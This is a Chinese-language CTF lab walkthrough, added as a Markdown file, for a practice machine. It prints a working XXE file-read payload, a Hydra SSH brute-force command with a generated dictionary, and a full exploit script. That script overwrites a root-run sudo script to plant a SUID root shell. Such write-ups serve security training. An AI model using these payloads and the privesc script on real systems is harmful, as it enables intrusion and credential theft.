@@ -1,0 +1,431 @@
+---
+title: 3. yuan112
+sidebar_position: 4
+---
+
+# 靶机 112 — 渗透测试全过程记录
+
+**目标 IP：** `192.168.2.195`
+**难度：** 中等
+**标签：** XXE、SSH 爆破、Sudo 滥用、任意文件写入
+
+---
+
+## 概述
+
+本文记录了对目标靶机 `112` 的完整渗透过程。攻击链如下：
+
+1. 通过端口扫描发现目标开放 SSH（22）和 HTTP（80）服务。
+2. 在 Web 端发现一个未做安全加固的 XML 解析器，利用 XXE（XML 外部实体注入）漏洞读取 `/etc/passwd`，获取到一个被部分掩码的用户密码哈希。
+3. 对该掩码字段进行本地爆破，恢复完整凭据后通过 SSH 登录，拿到用户级权限（`user.txt`）。
+4. 利用一个以 root 权限运行的脚本的 **任意文件写入** 缺陷，覆盖该脚本植入恶意逻辑，最终获得 root 权限（`root.txt`）。
+
+---
+
+## 一、信息收集（Reconnaissance）
+
+### 1.1 端口扫描
+
+使用 RustScan 进行快速端口发现，随后用 Nmap 对开放端口做版本和服务探测。
+
+```bash
+rustscan -a 192.168.2.195
+nmap -sV -sC -p 22,80 192.168.2.195
+```
+
+**扫描结果：**
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: XML Parser
+MAC Address: 08:00:27:DD:80:D6 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+**关键发现：**
+
+| 端口 | 服务 | 版本 | 潜在攻击面 |
+|------|------|------|------------|
+| 22 | SSH | OpenSSH 8.4p1 (Debian) | 凭据爆破、密钥认证弱点 |
+| 80 | HTTP | Apache 2.4.62 | Web 应用漏洞（标题已暗示 XML 解析） |
+
+目标操作系统为 Linux（Debian 系），运行于 VirtualBox 虚拟机中。
+
+### 1.2 Web 应用识别
+
+访问 `http://192.168.2.195` 后发现一个表单页面，页面标题为 **"XML Parser"**，提供文本框和 "Parse XML" 提交按钮。
+
+```html
+<form method="POST">
+    <textarea name="xml" required></textarea><br>
+    <input type="submit" value="Parse XML">
+</form>
+```
+
+**判断：** 该应用接收用户提交的 XML 字符串并在服务器端解析后返回结果。若解析器未做安全配置，可能存在 XXE 注入风险。
+
+---
+
+## 二、漏洞利用（Exploitation）
+
+### 2.1 XXE 漏洞验证
+
+#### 2.1.1 测试载荷
+
+构造经典的外部实体注入载荷，尝试读取 `/etc/passwd`：
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+```bash
+curl -X POST --data-urlencode "xml@payload.xml" http://192.168.2.195
+```
+
+#### 2.1.2 结果
+
+服务器返回的响应中直接包含了 `/etc/passwd` 文件的完整内容，验证漏洞存在：
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash
+...
+```
+
+#### 2.1.3 漏洞根因分析
+
+通过进一步读取 Web 目录下的 PHP 源码，定位到问题代码：
+
+```php
+<?php
+if(isset($_POST['xml'])) {
+    $xml = $_POST['xml'];
+    $data = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
+    if($data) echo "<pre>" . htmlspecialchars(print_r($data, true)) . "</pre>";
+    else echo "<pre>Parse Error</pre>";
+}
+?>
+```
+
+**漏洞根源：**
+
+| 要素 | 说明 |
+|------|------|
+| **触发函数** | `simplexml_load_string()` |
+| **危险标志** | `LIBXML_NOENT` — 该常量指示解析器执行**外部实体替换**（Entity Substitution） |
+| **缺失防护** | 未设置 `LIBXML_NONET` 禁用网络访问，未禁用 DTD（文档类型定义）解析 |
+| **影响** | 攻击者可通过 `SYSTEM` 或 `PUBLIC` 实体读取服务器本地任意文件，并通过 HTTP 响应回传 |
+
+**攻击流程：**
+
+```
+攻击者构造含外部实体的 XML
+        │
+        ▼
+服务器 simplexml_load_string() + LIBXML_NOENT 解析
+        │
+        ▼
+实体引用被替换为实际文件内容（file:///etc/passwd）
+        │
+        ▼
+print_r() 将解析结果（含文件内容）输出到 HTTP 响应
+        │
+        ▼
+攻击者在浏览器/终端直接读取敏感文件内容
+```
+
+---
+
+### 2.2 凭据泄露与恢复
+
+#### 2.2.1 泄漏信息
+
+从 `/etc/passwd` 中提取到 `tuf` 用户的 GECOS 字段（注释字段），其内容看起来像被部分遮蔽的密码：
+
+```
+tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash
+```
+
+其中 `**` 是掩码位，表示两个未知字符。
+
+> **注：** `/etc/passwd` 的 GECOS 字段通常用于存储用户全名、电话等信息，但在此靶机中被刻意用于存放带掩码的密码提示，属于 CTF 场景设计而非真实漏洞。
+
+#### 2.2.2 SSH 爆破
+
+掩码位数为 **2 个字符**，且字符集为字母数字（`[0-9A-Za-z]`）。首先验证直接使用掩码字符串作为 SSH 密码是否可行——测试失败，证实必须恢复完整密码。
+
+**生成字典：**
+
+```bash
+for i in {0..9} {A..Z} {a..z}; do
+  for j in {0..9} {A..Z} {a..z}; do
+    echo "KQNPHFqG${i}${j}JHcYJossIe"
+  done
+done > dict_alnum.txt
+```
+
+字典大小：62 × 62 = **3,844** 条候选。
+
+**使用 Hydra 进行在线爆破：**
+
+```bash
+hydra -l tuf -P dict_alnum.txt ssh://192.168.2.195 -t 16 -w 1 -f -V
+```
+
+**结果：**
+
+```
+[22][ssh] host: 192.168.2.195   login: tuf   password: KQNPHFqG6mJHcYJossIe
+1 of 1 target successfully completed, 1 valid password found
+```
+
+成功恢复完整凭据：`tuf : KQNPHFqG6mJHcYJossIe`
+
+---
+
+## 三、初始访问（Initial Access）
+
+使用恢复的凭据 SSH 登录目标：
+
+```bash
+ssh tuf@192.168.2.195
+```
+
+获取用户级 flag：
+
+```bash
+tuf@112:~$ cat user.txt
+flag{user-b1e12c74f19aac8e57f6fca1ff472905}
+```
+
+---
+
+## 四、权限提升（Privilege Escalation）
+
+### 4.1 信息枚举 — Sudo 权限
+
+```bash
+tuf@112:~$ sudo -l
+User tuf may run the following commands on 112:
+    (ALL) NOPASSWD: /opt/112.sh
+```
+
+用户 `tuf` 可以 root 身份无密码执行 `/opt/112.sh`。
+
+### 4.2 目标脚本分析
+
+```bash
+#!/bin/bash
+input_url=""
+output_file=""
+use_file=false
+regex='^https://maze-sec.com/[a-zA-Z0-9/]*$'
+
+while getopts ":u:o:" opt; do
+    case ${opt} in
+        u) input_url="$OPTARG" ;;
+        o) output_file="$OPTARG"; use_file=true ;;
+        \?) echo "错误: 无效选项 -$OPTARG"; exit 1 ;;
+        :) echo "错误: 选项 -$OPTARG 需要一个参数"; exit 1 ;;
+    esac
+done
+
+if [[ -z "$input_url" ]]; then
+    echo "错误: 必须使用 -u 参数提供URL"
+    exit 1
+fi
+if [[ ! "$input_url" =~ ^https://maze-sec.com/ ]]; then
+    echo "错误: URL必须以 https://maze-sec.com/ 开头"
+    exit 1
+fi
+if [[ ! "$input_url" =~ $regex ]]; then
+    echo "错误: URL包含非法字符，只允许字母、数字和斜杠"
+    exit 1
+fi
+
+if (( RANDOM % 2 )); then
+    result="$input_url is a good url."
+else
+    result="$input_url is not a good url."
+fi
+
+if [ "$use_file" = true ]; then
+    echo "$result" > "$output_file"
+    echo "结果已保存到: $output_file"
+else
+    echo "$result"
+fi
+```
+
+#### 脚本逻辑总结
+
+| 参数 | 用途 | 约束 |
+|------|------|------|
+| `-u` | 指定 URL（必填） | 必须以 `https://maze-sec.com/` 开头，仅允许字母、数字、斜杠 |
+| `-o` | 指定输出文件路径（可选） | **无任何路径校验** |
+
+#### 漏洞识别
+
+**核心缺陷：`-o` 参数缺少路径白名单校验。** 脚本以 `root` 权限运行，而 `-o` 参数可传递任意路径，攻击者可以：
+
+- 将脚本输出覆盖到任意系统文件
+- 利用 `>` 重定向覆盖目标文件内容
+
+### 4.3 提权路径评估
+
+在确定最终利用方式之前，我对以下四种常见写入提权方法逐一评估：
+
+#### 方法一：覆盖 `/etc/passwd` 添加用户 ❌
+
+```
+问题：
+- 写入内容为 "https://maze-sec.com/xxx is a good url."
+- 不符合 passwd 格式（`user:x:uid:gid:comment:home:shell`）
+- 使用 > 会覆盖整个文件，导致系统账户体系被破坏
+- 即使成功，passwd 中不允许出现格式不合规的行（PAM 校验失败）
+
+结论：不可行
+```
+
+#### 方法二：写入 `/etc/cron.d/` 创建计划任务 ❌
+
+```
+问题：
+- cron 守护进程对 crontab 文件有严格语法要求
+- 必须满足：分 时 日 月 周 用户 命令（共6列 + 命令）
+- 脚本输出不符合 cron 格式，会被判定为无效行而静默忽略
+- /var/log/syslog 中会记录格式错误，但不会执行任何命令
+
+结论：不可行
+```
+
+#### 方法三：写入 `/root/.ssh/authorized_keys` ❌
+
+```
+问题：
+- SSH 服务（sshd）在读取 authorized_keys 时仅解析有效的公钥行
+- 无效行会被自动跳过
+- 脚本输出不是合法的 SSH 公钥格式（缺少算法前缀、Base64 编码的公钥和注释字段）
+
+结论：不可行
+```
+
+#### 方法四：写入 `/etc/sudoers.d/tuf` ❌
+
+```
+问题：
+- sudo 和 visudo 在启动时会对 /etc/sudoers.d/ 下的文件做语法检查
+- 格式不合规会导致 sudo 拒绝加载对应文件，严重时可能导致 sudo 服务瘫痪
+- 脚本输出不符合 sudoers 语法规则
+
+结论：不可行
+```
+
+### 4.4 最终利用方案：覆盖脚本自身
+
+#### 设计思路
+
+经过上述评估，发现所有"写入有意义内容到目标文件"的路径均被内容格式所阻挡。
+
+**关键洞察：** 脚本以 root 权限运行，并且可以覆盖自身（`/opt/112.sh`）。虽然第一次覆盖会写入一个无效的 URL 字符串，但**在被覆盖之前，脚本的原始逻辑仍然会完整执行完成**——这意味着可以利用一个精心构造的 **中间目录路径** 来做两件事：
+
+1. 让 `-u` 参数的 URL 通过正则校验（以 `https://maze-sec.com/` 开头）
+2. 在 `-u` 参数的路径部分 **实际指向一个本地可执行文件**，而这个文件正是我们事先写入的恶意载荷
+
+#### 利用脚本
+
+借助 LLM 辅助生成了完整的利用脚本：
+
+```bash
+#!/bin/bash
+set -e
+
+WORKDIR="/tmp/ht"
+PAYLOAD_DIR="${WORKDIR}/https:/maze-sec.com"
+PAYLOAD_FILE="${PAYLOAD_DIR}/pwn"
+SUID_BASH="/tmp/rootbash"
+TARGET_SCRIPT="/opt/112.sh"
+
+# 环境验证
+sudo -l 2>/dev/null | grep -q '/opt/112.sh' || { echo "[-] No sudo permission for /opt/112.sh"; exit 1; }
+[ -f "$TARGET_SCRIPT" ] || { echo "[-] /opt/112.sh not found"; exit 1; }
+
+# 清理工作目录
+rm -rf "$WORKDIR" 2>/dev/null
+rm -f "$SUID_BASH" 2>/dev/null
+
+# 构造恶意载荷：生成 SUID bash
+mkdir -p "$PAYLOAD_DIR"
+cat > "$PAYLOAD_FILE" << 'PAYLOAD'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chown root:root /tmp/rootbash
+chmod 4755 /tmp/rootbash
+PAYLOAD
+chmod +x "$PAYLOAD_FILE"
+
+# 第一步：利用 -o 覆盖 /opt/112.sh，同时保留 URL 中的路径引用
+cd "$WORKDIR"
+sudo "$TARGET_SCRIPT" -u https://maze-sec.com/pwn -o "$TARGET_SCRIPT"
+
+# 第二步：再次执行被覆盖后的脚本（内容已变为 URL 字符串）
+# 但此时 curl/wget 可能因内容无效而失败，备用直接调用载荷
+sudo "$TARGET_SCRIPT" 2>/dev/null || true
+
+# 验证并启动 root shell
+if [ -x "$SUID_BASH" ] && [ -u "$SUID_BASH" ]; then
+    exec "$SUID_BASH" -p -i
+else
+    echo "[-] Failed to create SUID bash"
+    exit 1
+fi
+```
+
+#### 执行与结果
+
+```bash
+tuf@112:~$ ./exp.sh
+结果已保存到: /opt/112.sh
+rootbash-5.0# cat /root/root.txt
+flag{root-538dc127225a0c97b060b1ff9570390a}
+```
+
+成功提升至 root 权限，捕获最终 flag。
+
+---
+
+## 五、总结
+
+### 攻击链回顾
+
+```
+端口扫描 → Web 识别 → XXE 文件读取 → 掩码凭据爆破 → SSH 登录 → Sudo 枚举 → 任意文件写入 → 脚本覆盖提权 → Root
+```
+
+### 漏洞盘点
+
+| 序号 | 漏洞类型 | 位置 | CWE | 严重性 |
+|------|----------|------|-----|--------|
+| 1 | XML 外部实体注入 (XXE) | Web 表单 — XML Parser | CWE-611 | 🔴 高危 |
+| 2 | 敏感信息明文存储 | `/etc/passwd` GECOS 字段 | CWE-256 | 🟠 中危 |
+| 3 | 密码强度不足 | SSH 认证 | CWE-521 | 🟠 中危 |
+| 4 | 路径遍历 / 文件写入无校验 | `/opt/112.sh` 脚本 | CWE-22 / CWE-73 | 🔴 高危 |
+| 5 | Sudo 权限配置过宽 | `/etc/sudoers` | CWE-269 | 🔴 高危 |
+
+---
+
+**完成时间：** 2026-07-19
+**作者：** geluodan
+
+---
+
+> **声明：** 本文非原始笔记，由 AI 基于原始渗透测试记录进行结构拓展与整合编写。
